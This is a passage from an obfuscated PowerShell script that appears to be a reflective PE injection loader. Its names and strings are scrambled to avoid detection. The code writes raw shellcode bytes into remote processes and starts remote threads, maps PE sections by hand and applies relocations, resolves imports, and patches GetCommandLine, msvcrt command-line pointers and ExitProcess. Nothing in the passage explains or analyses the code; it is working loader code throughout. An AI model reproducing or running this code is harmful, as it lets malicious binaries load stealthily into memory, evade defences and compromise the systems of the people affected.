                [Parameter(pOSItIon = 0, mandATorY = $true)]
                [IntPtr]
                $VAR0161,

                [Parameter(POsitiOn = 1, MAnDAToRY = $true)]
                [IntPtr]
                $VAR0183,

                [Parameter(pOSitioN = 2, mANDaTory = $true)]
                [IntPtr]
                $VAR0184, 

                [Parameter(poSitiON = 3, mAnDatOrY = $true)]
                [Bool]
                $VAR0185
            )

            $VAR0163 =   (  gEt-VaRiabLE ('R'+'t8')  ).VALue::SIzeoF([Type][IntPtr])

            [IntPtr]$VAR0186 =  $LxQ4::ZEro   
            
            if (-not $VAR0185) {
                $VAR0187 =   (vARIABLE  ('R'+'T8') -vALuEonl )::ptrTOStriNgAnSI($VAR0184)

                
                $VAR0188 = [UIntPtr][UInt64]([UInt64]$VAR0187.LENgtH + 1)
                $VAR0186 = $VAR0042.fUN032.iNVOKE($VAR0161,   (itEm  ("VaRIABl"+"E:LXq"+"4") ).VaLUE::zerO, $VAR0188, $VAR0041.CONsT001 -bor $VAR0041.coNSt002, $VAR0041.CONSt005)
                if ($VAR0186 -eq  ( Get-vARIAbLe  ('l'+'Xq4')).vAluE::Zero) {
                    Throw ("{0}{1}{2}" -f 'ER','ROR','17')
                }

                [UIntPtr]$VAR0167 =   $OI4::zeRO
                $Success = $VAR0042.FUN045.inVOKE($VAR0161, $VAR0186, $VAR0184, $VAR0188, [Ref]$VAR0167)
                if ($Success -eq $false) {
                    Throw ("{2}{1}{0}"-f '8','ROR1','ER')
                }
                if ($VAR0188 -ne $VAR0167) {
                    Throw ("{0}{1}"-f 'ER','ROR19')
                }
            }
            
            else {
                $VAR0186 = $VAR0184
            }

            
            $VAR0168 = $VAR0042.FUN041.inVOke($VAR0302)
            $VAR0058 = $VAR0042.FUn036.INVOKE($VAR0168, $VAR0312) 

            
            $VAR0189 = $VAR0042.fun032.iNvOke($VAR0161,   ( gi  ('VAriA'+'BLe'+':lX'+'Q4')).VaLUE::ZERO, [UInt64][UInt64]$VAR0163, $VAR0041.Const001 -bor $VAR0041.cONst002, $VAR0041.COnsT005)
            if ($VAR0189 -eq  (  GET-iTEm  ('vAriable'+':'+'lxq4') ).vAlue::ZeRo) {
                Throw ("{1}{0}{2}"-f'R','E','ROR20')
            }

            
            
            [Byte[]]$VAR0190 = @()
            if ($VAR0126.coNST032 -eq $true) {
                $VAR01901 = 83,72,137,227,72,131,236,32,102,131,228,192,72,185
                $VAR01902 = 72,186
                $VAR01903 = 72,184
                $VAR01904 = 255,208,72,185
                $VAR01905 = 72,137,1,72,137,220,91,195
            }
            else {
                $VAR01901 = 83,137,227,131,228,192,184
                $VAR01902 = 185
                $VAR01903 = 81,80,184
                $VAR01904 = 255,208,185
                $VAR01905 = 137,1,137,220,91,195
            }
            $VAR0171 = $VAR01901.LENgTh + $VAR01902.LEnGTH + $VAR01903.LEnGTH + $VAR01904.LengTh + $VAR01905.lENgTH + ($VAR0163 * 4)
            $VAR0172 =   (Get-variaBLe  ('R'+'t8')  -vaLuE  )::AllochglobAL($VAR0171)
            $VAR0173 = $VAR0172

            FUN010 -Bytes $VAR01901 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01901.leNGtH)
             (  Get-ITem ('vaRI'+'aBlE'+':rt'+'8')  ).vaLuE::stRucTuREtOpTR($VAR0183, $VAR0172, $false)
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
            FUN010 -Bytes $VAR01902 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01902.LENGTH)
              (  Get-vAriAble ('r'+'t8')  ).valUe::strucTUrEtoPtR($VAR0186, $VAR0172, $false)
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
            FUN010 -Bytes $VAR01903 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01903.leNgTh)
              ( GI ('vArIAb'+'LE'+':R'+'t8')  ).VaLue::sTrucTUrEToPTr($VAR0058, $VAR0172, $false)
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
            FUN010 -Bytes $VAR01904 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01904.LeNgtH)
              (diR  ('VA'+'riA'+'BLe:RT8') ).vALUE::strUcturEtOPTR($VAR0189, $VAR0172, $false)
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
            FUN010 -Bytes $VAR01905 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01905.leNGtH)

            $VAR0178 = $VAR0042.FuN032.invOKE($VAR0161,  $LXQ4::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.conST001 -bor $VAR0041.COnSt002, $VAR0041.ConsT008)
            if ($VAR0178 -eq  ( vAriaBLe  ('LX'+'q4') -valUE )::ZerO) {
                Throw ("{2}{1}{0}"-f '1','ROR2','ER')
            }
            [UIntPtr]$VAR0167 =   $oI4::ZerO
            $Success = $VAR0042.FUN045.InVokE($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
            if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                Throw ("{1}{0}" -f '22','ERROR0')
            }

            $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
            $VAR0144 = $VAR0042.fUN044.InvOKe($VAR0179, 20000)
            if ($VAR0144 -ne 0) {
                Throw ("{1}{0}"-f 'OR23','ERR')
            }

            
            [IntPtr]$VAR0180 =  (  Ls  ('vAri'+'a'+'BLE:r'+'t8')).vAlUe::AlLOcHGlObAl($VAR0163)
            $VAR0144 = $VAR0042.FuN046.inVoKe($VAR0161, $VAR0189, $VAR0180, [UIntPtr][UInt64]$VAR0163, [Ref]$VAR0167)
            if (($VAR0144 -eq $false) -or ($VAR0167 -eq 0)) {
                Throw ("{2}{0}{1}" -f'R','24','ERRO')
            }
            [IntPtr]$VAR0191 =   (CHILDiteM ('V'+'aRIabl'+'e:rT8')  ).VALuE::PTRtOstRuCTurE($VAR0180, [Type][IntPtr])

            
            $VAR0042.Fun039.iNVOKe($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.cOnST025) | Out-Null
            $VAR0042.fuN039.INvoKe($VAR0161, $VAR0189, [UIntPtr][UInt64]0, $VAR0041.conSt025) | Out-Null

            if (-not $VAR0185) {
                $VAR0042.fuN039.InVoke($VAR0161, $VAR0186, [UIntPtr][UInt64]0, $VAR0041.CoNST025) | Out-Null
            }

            return $VAR0191
        }


        Function FUn0`20 {
            Param(
                [Parameter(POSitION = 0, MAndaToRy = $true)]
                [Byte[]]
                $VAR001,

                [Parameter(poSiTIon = 1, mANdAtoRy = $true)]
                [System.Object]
                $VAR0126,

                [Parameter(POSiTIon = 2, manDatoRY = $true)]
                [System.Object]
                $VAR0042,

                [Parameter(posItIoN = 3, MANDAtOry = $true)]
                [System.Object]
                $VAR010
            )

            for ( $i = 0; $i -lt $VAR0126.cOnST031.cONSt121.cONst072; $i++) {
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.ConsT036) ($i *   (  VarIAbLE  ("rT"+"8") -VaLUeon )::Sizeof([Type]$VAR010.cOnST142)))
                $VAR0192 =  ( VarIAbLE  ("r"+"T8")  -vA  )::PtrTOsTrUcTurE($VAR0160, [Type]$VAR010.cONsT142)

                
                [IntPtr]$VAR0193 = [IntPtr](FUN005 ([Int64]$VAR0126.vAR0263) ([Int64]$VAR0192.CoNst074))

                
                
                
                
                $VAR0194 = $VAR0192.ConSt144

                if ($VAR0192.conST145 -eq 0) {
                    $VAR0194 = 0
                }

                if ($VAR0194 -gt $VAR0192.CoNsT143) {
                    $VAR0194 = $VAR0192.cONST143
                }

                if ($VAR0194 -gt 0) {
                    FUN009 -VAR0125 ("{3}{2}{4}{1}{0}" -f 'Copy','Marshal','N02','FU','0::') -VAR0126 $VAR0126 -VAR0127 $VAR0193 -Size $VAR0194 | Out-Null
                     ( gi ('va'+'r'+'iABlE'+':rt8')).ValUE::CoPy($VAR001, [Int32]$VAR0192.COnSt145, $VAR0193, $VAR0194)
                }

                
                if ($VAR0192.CoNSt144 -lt $VAR0192.CONST143) {
                    $VAR0195 = $VAR0192.coNst143 - $VAR0194
                    [IntPtr]$VAR0127 = [IntPtr](FUN005 ([Int64]$VAR0193) ([Int64]$VAR0194))
                    FUN009 -VAR0125 ("{1}{3}{2}{0}"-f '034','FUN020:','FUN',':') -VAR0126 $VAR0126 -VAR0127 $VAR0127 -Size $VAR0195 | Out-Null
                    $VAR0042.FUn034.INVokE($VAR0127, 0, [IntPtr]$VAR0195) | Out-Null
                }
            }
        }


        Function fun021 {
            Param(
                [Parameter(PosiTIoN = 0, maNdatOry = $true)]
                [System.Object]
                $VAR0126,

                [Parameter(PoSiTIoN = 1, mAndatoRY = $true)]
                [Int64]
                $VAR0196,

                [Parameter(pOsItIoN = 2, mandAToRy = $true)]
                [System.Object]
                $VAR0041,

                [Parameter(poSItIon = 3, MANDAtOry = $true)]
                [System.Object]
                $VAR010
            )

            [Int64]$VAR0197 = 0
            $VAR0198 = $true 
            [UInt32]$VAR0199 =  (GeT-VariABle  ('RT'+'8') -vA)::siZeOF([Type]$VAR010.CONst150)

            
            if (($VAR0196 -eq [Int64]$VAR0126.ConSt039) `
                    -or ($VAR0126.conSt031.COnSt122.ConST112.siZE -eq 0)) {
                return
            }


            elseif ((FUN006 ($VAR0196) ($VAR0126.CoNST039)) -eq $true) {
                $VAR0197 = FUN004 ($VAR0196) ($VAR0126.const039)
                $VAR0198 = $false
            }
            elseif ((FUN006 ($VAR0126.conSt039) ($VAR0196)) -eq $true) {
                $VAR0197 = FUN004 ($VAR0126.CONSt039) ($VAR0196)
            }

            
            [IntPtr]$VAR0200 = [IntPtr](FUN005 ([Int64]$VAR0126.vaR0263) ([Int64]$VAR0126.CoNST031.cOnst122.coNST112.cONSt074))
            while ($true) {
                
                $VAR0201 =  (  GeT-VARiABlE  ('R'+'T8') -vaLueonlY )::PtrTosTructuRe($VAR0200, [Type]$VAR010.coNSt150)

                if ($VAR0201.CONST151 -eq 0) {
                    break
                }

                [IntPtr]$VAR0202 = [IntPtr](FUN005 ([Int64]$VAR0126.var0263) ([Int64]$VAR0201.CoNst074))
                $VAR0203 = ($VAR0201.ConSt151 - $VAR0199) / 2

                
                for ($i = 0; $i -lt $VAR0203; $i++) {
                    
                    $VAR0204 = [IntPtr](FUN005 ([IntPtr]$VAR0200) ([Int64]$VAR0199 + (2 * $i)))
                    [UInt16]$VAR0205 =  (GET-vArIABLE  ('r'+'t8')).VaLuE::PtRtostRUCTuRE($VAR0204, [Type][UInt16])

                    
                    [UInt16]$VAR0206 = $VAR0205 -band 0x0FFF
                    [UInt16]$VAR0207 = $VAR0205 -band 0xF000
                    for ($j = 0; $j -lt 12; $j++) {
                        $VAR0207 =   $3X78::FLOor($VAR0207 / 2)
                    }

                    
                    
                    
                    if (($VAR0207 -eq $VAR0041.CoNsT013) `
                            -or ($VAR0207 -eq $VAR0041.COnST014)) {
                        
                        [IntPtr]$VAR0208 = [IntPtr](FUN005 ([Int64]$VAR0202) ([Int64]$VAR0206))
                        [IntPtr]$VAR0209 =  (dir ('vARI'+'aBLe:R'+'t'+'8') ).VALue::PTRToStrUcTure($VAR0208, [Type][IntPtr])

                        if ($VAR0198 -eq $true) {
                            [IntPtr]$VAR0209 = [IntPtr](FUN005 ([Int64]$VAR0209) ($VAR0197))
                        }
                        else {
                            [IntPtr]$VAR0209 = [IntPtr](FUN004 ([Int64]$VAR0209) ($VAR0197))
                        }

                          ( GEt-vARiaBLe ('r'+'T8')  -vALu )::strUCtuRetoPTR($VAR0209, $VAR0208, $false) | Out-Null
                    }
                    elseif ($VAR0207 -ne $VAR0041.conSt012) {
                        
                        Throw ('ERRO'+'R'+'25: '+"$VAR0207, "+'ERRO'+'R26'+':'+' '+"$VAR0205")
                    }
                }

                $VAR0200 = [IntPtr](FUN005 ([Int64]$VAR0200) ([Int64]$VAR0201.CoNST151))
            }
        }


        Function fuN0`22 {
            Param(
                [Parameter(poSiTioN = 0, maNDAtORy = $true)]
                [System.Object]
                $VAR0126,

                [Parameter(PoSiTIon = 1, MandATory = $true)]
                [System.Object]
                $VAR0042,

                [Parameter(pOSItion = 2, MAndaTory = $true)]
                [System.Object]
                $VAR010,

                [Parameter(poSition = 3, MANDATorY = $true)]
                [System.Object]
                $VAR0041,

                [Parameter(posiTiON = 4, mAnDatory = $false)]
                [IntPtr]
                $VAR0161
            )

            $VAR0210 = $false
            if ($VAR0126.VAr0263 -ne $VAR0126.cOnST039) {
                $VAR0210 = $true
            }

            if ($VAR0126.CONST031.cOnsT122.CONst108.SIZe -gt 0) {
                [IntPtr]$VAR0211 = FUN005 ([Int64]$VAR0126.Var0263) ([Int64]$VAR0126.COnsT031.cOnst122.consT108.CoNst074)

                while ($true) {
                    $VAR0212 =   $rt8::PTrtostructUrE($VAR0211, [Type]$VAR010.cONst152)

                    
                    if ($VAR0212.const067 -eq 0 `
                            -and $VAR0212.ConSt154 -eq 0 `
                            -and $VAR0212.CoNst153 -eq 0 `
                            -and $VAR0212.nAmE -eq 0 `
                            -and $VAR0212.ConsT071 -eq 0) {
                        
                        break
                    }

                    $VAR0213 =  $LXq4::ZeRO
                    $VAR0162 = (FUN005 ([Int64]$VAR0126.vAR0263) ([Int64]$VAR0212.NamE))
                    $VAR0164 =  (gi ('VarIAB'+'l'+'E:RT8')).VAlUe::PtrtOSTriNGANsi($VAR0162)

                    if ($VAR0210 -eq $true) {
                        $VAR0213 = FUN018 -VAR0161 $VAR0161 -VAR0162 $VAR0162
                    }
                    else {
                        $VAR0213 = $VAR0042.fUN035.InvOKE($VAR0164)
                    }

                    if (($VAR0213 -eq $null) -or ($VAR0213 -eq  (get-vaRiABle ('L'+'xQ4')  -vALueO)::zero)) {
                        throw ('ERROR028'+':'+' '+"$VAR0164")
                    }

                    
                    [IntPtr]$VAR0214 = FUN005 ($VAR0126.VAr0263) ($VAR0212.CONsT154)
                    [IntPtr]$VAR0215 = FUN005 ($VAR0126.vaR0263) ($VAR0212.cOnst067) 
                    [IntPtr]$VAR0216 =  (get-VariabLE  ("RT"+"8")  ).vaLuE::PTRTOSTRUCtUre($VAR0215, [Type][IntPtr])

                    while ($VAR0216 -ne  ( vARIABlE  ("l"+"xQ4") -VAlUE)::zerO) {
                        $VAR0185 = $false
                        [IntPtr]$VAR0217 =  ( ls ('vARI'+'ABLe'+':L'+'xQ4')  ).valUe::zEro
                        
                        
                        
                        [IntPtr]$VAR0218 =  (gi  ('vAriAB'+'l'+'E:lxq4')  ).VAluE::ZeRO
                        if (  $rT8::SIZEOf([Type][IntPtr]) -eq 4 -and [Int32]$VAR0216 -lt 0) {
                            [IntPtr]$VAR0217 = [IntPtr]$VAR0216 -band 0xffff 
                            $VAR0185 = $true
                        }
                        elseif ( (variaBle  ("r"+"T8")  ).vALuE::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$VAR0216 -lt 0) {
                            [IntPtr]$VAR0217 = [Int64]$VAR0216 -band 0xffff 
                            $VAR0185 = $true
                        }
                        else {
                            [IntPtr]$VAR0219 = FUN005 ($VAR0126.vAR0263) ($VAR0216)
                            $VAR0219 = FUN005 $VAR0219 ( (vaRIAblE ('Rt'+'8')  -valu  )::sIzEof([Type][UInt16]))
                            $VAR0220 =  $Rt8::PTRToSTriNGANSi($VAR0219)
                            $VAR0217 =   $rt8::stRiNgTohGlOBALanSI($VAR0220)
                        }

                        if ($VAR0210 -eq $true) {
                            [IntPtr]$VAR0218 = FUN019 -VAR0161 $VAR0161 -VAR0183 $VAR0213 -VAR0184 $VAR0217 -VAR0185 $VAR0185
                        }
                        else {
                            [IntPtr]$VAR0218 = $VAR0042.FUN037.INvoKE($VAR0213, $VAR0217)
                        }

                        if ($VAR0218 -eq $null -or $VAR0218 -eq   (  gEt-vARIAbLe ('LxQ'+'4')  ).ValUE::ZeRo) {
                            if ($VAR0185) {
                                Throw ('ERROR0'+'30'+': '+"$VAR0217 "+"$VAR0164")
                            }
                            else {
                                Throw ('ER'+'ROR'+'3'+'1: '+"$VAR0220 "+"$VAR0164")
                            }
                        }

                         ( lS  ("va"+"R"+"iAb"+"Le:RT8") ).vALUE::StrUcTUREtOPtR($VAR0218, $VAR0214, $false)

                        $VAR0214 = FUN005 ([Int64]$VAR0214) (  ( Get-vaRIAble  ("R"+"t8") -vALU)::SIZeof([Type][IntPtr]))
                        [IntPtr]$VAR0215 = FUN005 ([Int64]$VAR0215) ( (gCI  ('vAriA'+'BLE:R'+'T8')).vALuE::siZeOF([Type][IntPtr]))
                        [IntPtr]$VAR0216 =   ( VaRIABLe  ('r'+'T8') -valU)::PtrtOsTrUctURe($VAR0215, [Type][IntPtr])

                        
                        
                        if ((-not $VAR0185) -and ($VAR0217 -ne   (  vAriaBLe ('Lx'+'q4')  ).valUE::ZerO)) {
                              $rt8::frEEHgLOBAl($VAR0217)
                            $VAR0217 =   $lXq4::Zero
                        }
                    }

                    $VAR0211 = FUN005 ($VAR0211) (  (  GCi  ('varia'+'b'+'LE:r'+'t8')).vAlue::SIZEof([Type]$VAR010.COnSt152))
                }
            }
        }

        Function fUN0`23 {
            Param(
                [Parameter(PoSItIoN = 0, MAnDatOry = $true)]
                [UInt32]
                $VAR0221
            )

            $VAR0222 = 0x0
            if (($VAR0221 -band $VAR0041.conSt016) -gt 0) {
                if (($VAR0221 -band $VAR0041.coNSt017) -gt 0) {
                    if (($VAR0221 -band $VAR0041.cOnst018) -gt 0) {
                        $VAR0222 = $VAR0041.cOnst008
                    }
                    else {
                        $VAR0222 = $VAR0041.CoNST009
                    }
                }
                else {
                    if (($VAR0221 -band $VAR0041.cONSt018) -gt 0) {
                        $VAR0222 = $VAR0041.const010
                    }
                    else {
                        $VAR0222 = $VAR0041.conSt007
                    }
                }
            }
            else {
                if (($VAR0221 -band $VAR0041.cONSt017) -gt 0) {
                    if (($VAR0221 -band $VAR0041.ConSt018) -gt 0) {
                        $VAR0222 = $VAR0041.coNst005
                    }
                    else {
                        $VAR0222 = $VAR0041.ConSt004
                    }
                }
                else {
                    if (($VAR0221 -band $VAR0041.ConST018) -gt 0) {
                        $VAR0222 = $VAR0041.CoNst006
                    }
                    else {
                        $VAR0222 = $VAR0041.cOnsT003
                    }
                }
            }

            if (($VAR0221 -band $VAR0041.cONST019) -gt 0) {
                $VAR0222 = $VAR0222 -bor $VAR0041.cOnst011
            }

            return $VAR0222
        }

        Function FU`N024 {
            Param(
                [Parameter(pOsitIon = 0, maNDAtorY = $true)]
                [System.Object]
                $VAR0126,
        
                [Parameter(poSItIOn = 1, mAnDaTorY = $true)]
                [System.Object]
                $VAR0042,
        
                [Parameter(POsItIoN = 2, manDatoRY = $true)]
                [System.Object]
                $VAR0041,
        
                [Parameter(pOsITIon = 3, mAnDATORy = $true)]
                [System.Object]
                $VAR010
            )
        
            for ( $i = 0; $i -lt $VAR0126.cONst031.cONSt121.cOnst072; $i++) {
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.cONST036) ($i *   $RT8::sIzEOf([Type]$VAR010.CONsT142)))
                $VAR0192 =  ( itEm  ('V'+'A'+'RIable:r'+'T8') ).vALuE::PTRtOStrUCTUre($VAR0160, [Type]$VAR010.ConSt142)
                [IntPtr]$VAR0223 = FUN005 ($VAR0126.VAR0263) ($VAR0192.conSt074)
            
                [UInt32]$VAR0224 = FUN023 $VAR0192.CONST067
                [UInt32]$VAR0225 = $VAR0192.conSt143
            
                [UInt32]$VAR0226 = 0
                FUN009 -VAR0125 ("{1}{0}{2}{3}"-f '4','FUN02','::FUN0','40') -VAR0126 $VAR0126 -VAR0127 $VAR0223 -Size $VAR0225 | Out-Null
                $Success = $VAR0042.fUN040.invokE($VAR0223, $VAR0225, $VAR0224, [Ref]$VAR0226)
                if ($Success -eq $false) {
                    Throw ("{1}{2}{0}" -f'OR32','E','RR')
                }
            }
        }

        
        
        Function fU`N025 {
            Param(
                [Parameter(POsItIon = 0, mandATOrY = $true)]
                [System.Object]
                $VAR0126,
    
                [Parameter(pOsITiOn = 1, mAnDatoRy = $true)]
                [System.Object]
                $VAR0042,
    
                [Parameter(poSitiON = 2, MAndatORY = $true)]
                [System.Object]
                $VAR0041,
    
                [Parameter(pOsiTioN = 3, mAndAToRy = $true)]
                [String]
                $VAR0227,
    
                [Parameter(POsItIoN = 4, MaNDAtory = $true)]
                [IntPtr]
                $VAR0228
            )
        
            
            $VAR0229 = @()
    
            $VAR0163 =  (  VArIABlE ('R'+'t8')).valUE::SIZeOf([Type][IntPtr])
            [UInt32]$VAR0226 = 0
    
            [IntPtr]$VAR0168 = $VAR0042.fUN041.invoKe($VAR0302)
            if ($VAR0168 -eq  (  gCi  ('va'+'RiABLE:lX'+'q4')).VALue::ZerO) {
                throw ("{2}{0}{1}" -f'R','OR33','ER')
            }
    
            [IntPtr]$VAR0230 = $VAR0042.FuN041.inVoKe(("{0}{4}{2}{3}{1}"-f'Ker','l','el','Base.dl','n'))
            if ($VAR0230 -eq   (GeT-ChILditem ('Var'+'IAB'+'LE:lx'+'Q4')  ).valuE::ZEro) {
                throw ("{0}{2}{1}"-f'ERR','R34','O')
            }
    
            
            
            
            $VAR0231 =  (VaRiaBlE  ('rT'+'8') ).valUE::stRIngtoHGLObALUni($VAR0227)
            $VAR0232 =  (cHIlditEm ('vAR'+'i'+'able'+':rt8')).VALUE::STRingtohGloBAlANsI($VAR0227)
    
            [IntPtr]$VAR0233 = $VAR0042.FUn036.inVokE($VAR0230, ("{2}{1}{0}{3}" -f'mm','tCo','Ge','andLineA'))
            [IntPtr]$VAR0234 = $VAR0042.FUN036.iNVokE($VAR0230, ("{1}{3}{0}{2}" -f 'a','GetCo','ndLineW','mm'))
    
            if ($VAR0233 -eq  (  iTeM ('vaRiABl'+'e'+':'+'LXq4') ).vaLUe::ZErO -or $VAR0234 -eq  ( vaRiaBLE ("l"+"xQ4")).VALue::zeRo) {
                throw "ERROR036: $(FUN008 $VAR0233). ERROR037: $(FUN008 $VAR0234) "
            }
    
            
            [Byte[]]$VAR0235 = @()
            if ($VAR0163 -eq 8) {
                $VAR0235 += 0x48 
            }
            $VAR0235 += 0xb8
    
            [Byte[]]$VAR0236 = 195
            $VAR0237 = $VAR0235.leNgtH + $VAR0163 + $VAR0236.lENGth
    
            
            $VAR0238 =  (  gci ("VaRiaBLE"+":Rt"+"8")  ).VAluE::aLlochGLobal($VAR0237)
            $VAR0239 =  $rt8::allocHglOBaL($VAR0237)
            $VAR0042.Fun033.inVOke($VAR0238, $VAR0233, [UInt64]$VAR0237) | Out-Null
            $VAR0042.FUN033.InvOKE($VAR0239, $VAR0234, [UInt64]$VAR0237) | Out-Null
            $VAR0229 += , ($VAR0233, $VAR0238, $VAR0237)
            $VAR0229 += , ($VAR0234, $VAR0239, $VAR0237)
    
            
            [UInt32]$VAR0226 = 0
            $Success = $VAR0042.fun040.iNVokE($VAR0233, [UInt32]$VAR0237, [UInt32]($VAR0041.COnSt008), [Ref]$VAR0226)
            if ($Success = $false) {
                throw ("{0}{1}" -f 'ERRO','R39')
            }
    
            $VAR0240 = $VAR0233
            FUN010 -Bytes $VAR0235 -VAR0129 $VAR0240
            $VAR0240 = FUN005 $VAR0240 ($VAR0235.lENGth)
             ( vaRiaBLE ("R"+"t8")  ).vaLue::sTructuReToPtr($VAR0232, $VAR0240, $false)
            $VAR0240 = FUN005 $VAR0240 $VAR0163
            FUN010 -Bytes $VAR0236 -VAR0129 $VAR0240
    
            $VAR0042.FUN040.iNVOkE($VAR0233, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
    
    
            
            [UInt32]$VAR0226 = 0
            $Success = $VAR0042.fuN040.InvoKe($VAR0234, [UInt32]$VAR0237, [UInt32]($VAR0041.cOnSt008), [Ref]$VAR0226)
            if ($Success = $false) {
                throw ("{0}{1}{2}" -f'ER','R','OR40')
            }
    
            $VAR0234Temp = $VAR0234
            FUN010 -Bytes $VAR0235 -VAR0129 $VAR0234Temp
            $VAR0234Temp = FUN005 $VAR0234Temp ($VAR0235.LengTh)
              $rt8::struCTUREtopTR($VAR0231, $VAR0234Temp, $false)
            $VAR0234Temp = FUN005 $VAR0234Temp $VAR0163
            FUN010 -Bytes $VAR0236 -VAR0129 $VAR0234Temp
    
            $VAR0042.fUN040.invOke($VAR0234, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
            
    
            
            
            
            
            
            $VAR0241 = @(("{2}{1}{0}"-f '0d.dll','cr7','msv'), ("{2}{1}{3}{0}" -f'dll','sv','m','cr71d.'), ("{3}{1}{0}{2}" -f'cr','sv','80d.dll','m'), ("{1}{2}{0}{3}"-f'r','m','svc','90d.dll'), ("{2}{1}{0}" -f 'd.dll','100','msvcr'), ("{0}{1}{2}" -f'ms','vcr110','d.dll'), ("{0}{2}{1}{3}"-f'msvc','dl','r70.','l') `
                    , ("{2}{3}{0}{1}"-f '71.d','ll','msvc','r'), ("{0}{1}{2}"-f 'msvcr8','0.','dll'), ("{2}{0}{1}{3}"-f'svcr','90.dl','m','l'), ("{2}{1}{0}" -f 'dll','r100.','msvc'), ("{3}{2}{0}{1}"-f'dl','l','10.','msvcr1'), ("{1}{0}{2}" -f'cr120.d','msv','ll'), ("{0}{2}{1}{3}"-f'ms','t.','vcr','dll'))
    
            foreach ($VAR0242 in $VAR0241) {
                [IntPtr]$VAR0243 = $VAR0042.FUn041.INvOKE($VAR0242)
                if ($VAR0243 -ne   ( gEt-VarIablE ("lX"+"Q4") -VaL )::zeRo) {
                    [IntPtr]$VAR0244 = $VAR0042.Fun036.INVoKe($VAR0243, ("{1}{2}{0}"-f 'n','_','wcmdl'))
                    [IntPtr]$VAR0245 = $VAR0042.fUN036.INVOke($VAR0243, ("{0}{2}{1}" -f '_a','ln','cmd'))
                    if ($VAR0244 -eq   $LXq4::zErO -or $VAR0245 -eq   $lxQ4::zErO) {
                        ("{0}{1}"-f'E','RROR41')
                    }
    
                    $VAR0246 =   $Rt8::StRiNgtOhGlOBAlAnSi($VAR0227)
                    $VAR0247 =  ( cHIlDItem  ('VaRi'+'AblE:RT'+'8') ).vaLUe::StRInGtOHGLOBALunI($VAR0227)
    
                    
                    $VAR0248 =   (  GI  ('VaRia'+'bLE:r'+'t8') ).VALUE::pTRtOsTruCture($VAR0245, [Type][IntPtr])
                    $VAR0249 =  $RT8::pTRtOSTRuctuRE($VAR0244, [Type][IntPtr])
                    $VAR0250 =   $Rt8::ALLoCHGLoBal($VAR0163)
                    $VAR0251 =  (  varIable  ('rT'+'8') -Val)::allOcHglOBAL($VAR0163)
                      $Rt8::STruCtUReTOPTR($VAR0248, $VAR0250, $false)
                      ( Get-vaRiaBlE  ('r'+'t8') -VaL)::strUCtUretoPtr($VAR0249, $VAR0251, $false)
                    $VAR0229 += , ($VAR0245, $VAR0250, $VAR0163)
                    $VAR0229 += , ($VAR0244, $VAR0251, $VAR0163)
    
                    $Success = $VAR0042.FUn040.iNvoKE($VAR0245, [UInt32]$VAR0163, [UInt32]($VAR0041.CONsT008), [Ref]$VAR0226)
                    if ($Success = $false) {
                        throw ("{2}{0}{1}" -f'ROR','42','ER')
                    }
                      $RT8::STRuctuREtOPTR($VAR0246, $VAR0245, $false)
                    $VAR0042.fUN040.INVoKe($VAR0245, [UInt32]$VAR0163, [UInt32]($VAR0226), [Ref]$VAR0226) | Out-Null
    
                    $Success = $VAR0042.FUN040.iNvoke($VAR0244, [UInt32]$VAR0163, [UInt32]($VAR0041.cONSt008), [Ref]$VAR0226)
                    if ($Success = $false) {
                        throw ("{1}{0}" -f'ROR43','ER')
                    }
                      $rt8::sTRuctUretOPtR($VAR0247, $VAR0244, $false)
                    $VAR0042.fuN040.InvOKE($VAR0244, [UInt32]$VAR0163, [UInt32]($VAR0226), [Ref]$VAR0226) | Out-Null
                }
            }
            
    
            
            
    
            $VAR0229 = @()
            $VAR0252 = @() 
    
            
            [IntPtr]$VAR0253 = $VAR0042.fun041.INvOkE(("{2}{1}{0}{3}" -f 'e.dl','score','m','l'))
            if ($VAR0253 -eq   (get-childITem  ('V'+'arIa'+'Ble:Lxq4')  ).ValUe::ZeRo) {
                throw ("{1}{0}" -f '4','ERROR04')
            }
            [IntPtr]$VAR0254 = $VAR0042.FUn036.INVokE($VAR0253, ("{0}{2}{4}{1}{3}"-f'C','xitProce','or','ss','E'))
            if ($VAR0254 -eq   (  dir  ('va'+'Ri'+'aBle:l'+'Xq4')).valUE::ZERo) {
                Throw ("{2}{0}{1}" -f'R','45','ERRO')
            }
            $VAR0252 += $VAR0254
    
            
            [IntPtr]$VAR0255 = $VAR0042.fUN036.INVOKE($VAR0168, ("{0}{1}{2}"-f 'E','xitProc','ess'))
            if ($VAR0255 -eq  (geT-variaBle ("L"+"xQ4") -vA)::zERo) {
                Throw ("{1}{0}{2}"-f 'OR','ERR','46')
            }
            $VAR0252 += $VAR0255
    
            [UInt32]$VAR0226 = 0
            foreach ($VAR0256 in $VAR0252) {
                $VAR0257 = $VAR0256
                
                
                [Byte[]]$VAR0235 = 187
                [Byte[]]$VAR0236 = 198,3,1,131,236,32,131,228,192,187
                
                if ($VAR0163 -eq 8) {
                    [Byte[]]$VAR0235 = 72,187
                    [Byte[]]$VAR0236 = 198,3,1,72,131,236,32,102,131,228,192,72,187
                }
                [Byte[]]$VAR0258 = 255,211
                $VAR0237 = $VAR0235.LEngth + $VAR0163 + $VAR0236.LEngth + $VAR0163 + $VAR0258.LenGtH
    
